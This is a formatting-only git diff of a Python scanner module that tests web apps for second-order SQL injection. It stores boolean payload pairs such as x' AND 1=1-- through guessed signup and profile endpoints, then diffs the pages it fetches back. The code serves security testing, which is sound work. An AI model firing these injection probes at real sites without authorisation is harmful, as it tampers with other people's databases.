@@ -6,6 +6,7 @@ store a marker + boolean pair, fetch, and diff the fetched responses.
 
 Store/fetch endpoints are inferred from common paths; callers can override.
 """
+
 from typing import Dict, List, Optional
 
 import requests
@@ -16,12 +17,28 @@ from tools.log_utils import get_logger
 logger = get_logger("second_order_sqli")
 
 STORE_PATHS = [
-    "/register", "/signup", "/profile/update", "/profile", "/settings",
-    "/api/user/update", "/api/user", "/comment", "/post", "/review", "/feedback",
+    "/register",
+    "/signup",
+    "/profile/update",
+    "/profile",
+    "/settings",
+    "/api/user/update",
+    "/api/user",
+    "/comment",
+    "/post",
+    "/review",
+    "/feedback",
 ]
 FETCH_PATHS = [
-    "/profile", "/me", "/dashboard", "/account", "/api/user",
-    "/api/profile", "/post", "/view", "/admin/users",
+    "/profile",
+    "/me",
+    "/dashboard",
+    "/account",
+    "/api/user",
+    "/api/profile",
+    "/post",
+    "/view",
+    "/admin/users",
 ]
 
 MARKER = "SOSQLI_%d" % 12345
@@ -29,13 +46,14 @@ MARKER = "SOSQLI_%d" % 12345
 _BOOL_PAIRS = [
     ("x' AND 1=1-- ", "x' AND 1=2-- "),
     ("x' OR '1'='1' -- ", "x' OR '1'='2' -- "),
-    ("x\" AND 1=1-- ", "x\" AND 1=2-- "),
+    ('x" AND 1=1-- ', 'x" AND 1=2-- '),
     ("x AND 1=1-- ", "x AND 1=2-- "),
 ]
 
 
 def _guess_paths(url: str) -> tuple:
     from urllib.parse import urlparse
+
     parsed = urlparse(url)
     base = "%s://%s" % (parsed.scheme, parsed.netloc)
     path = parsed.path.rstrip("/")
@@ -57,13 +75,23 @@ def _diff_significant(r1, r2) -> bool:
     return abs(len(r1.text) - len(r2.text)) > 40
 
 
-def check(url: str, param: str = "username", sess: Optional[requests.Session] = None,
-          timeout: float = 10.0, store_paths: Optional[List[str]] = None,
-          fetch_paths: Optional[List[str]] = None) -> Dict:
+def check(
+    url: str,
+    param: str = "username",
+    sess: Optional[requests.Session] = None,
+    timeout: float = 10.0,
+    store_paths: Optional[List[str]] = None,
+    fetch_paths: Optional[List[str]] = None,
+) -> Dict:
     sess = sess or make_session()
-    result = {"vulnerable": False, "type": "second_order_sqli",
-              "evidence": [], "store_path": None, "fetch_path": None,
-              "pair": None}
+    result = {
+        "vulnerable": False,
+        "type": "second_order_sqli",
+        "evidence": [],
+        "store_path": None,
+        "fetch_path": None,
+        "pair": None,
+    }
     stores, fetches = _guess_paths(url)
     if store_paths:
         stores = store_paths + stores
@@ -89,8 +117,9 @@ def check(url: str, param: str = "username", sess: Optional[requests.Session] = 
                 result["fetch_path"] = fetches[0]
                 result["pair"] = (true_p[:20], false_p[:20])
                 result["evidence"].append(
-                    "second-order: stored %s at %s, fetched diff at %s (reflected=%s)" % (
-                        true_p[:20], store_url, fetches[0], reflected))
+                    "second-order: stored %s at %s, fetched diff at %s (reflected=%s)"
+                    % (true_p[:20], store_url, fetches[0], reflected)
+                )
                 return result
 
     return result
